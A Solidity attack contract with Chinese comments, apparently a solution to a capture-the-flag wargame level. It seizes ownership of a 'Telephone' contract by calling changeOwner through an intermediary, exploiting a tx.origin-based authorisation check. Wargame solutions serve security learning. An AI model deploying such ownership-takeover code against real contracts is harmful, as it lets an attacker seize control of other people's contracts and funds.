// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 定義目標合約的介面，增加可讀性與安全性
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    // 雖然不是必須，但存儲 owner 是一個好習慣，
    // 方便之後追蹤是誰部署了這個攻擊合約
    address public attacker;

    constructor() {
        attacker = msg.sender;
    }

    // 核心攻擊函數
    function attack(address _target, address _newOwner) public {
        // 使用 Interface 調用
        // 這樣編譯器會幫你檢查參數型別，比用 .call() 安全得多
        ITelephone(_target).changeOwner(_newOwner);
    }
}
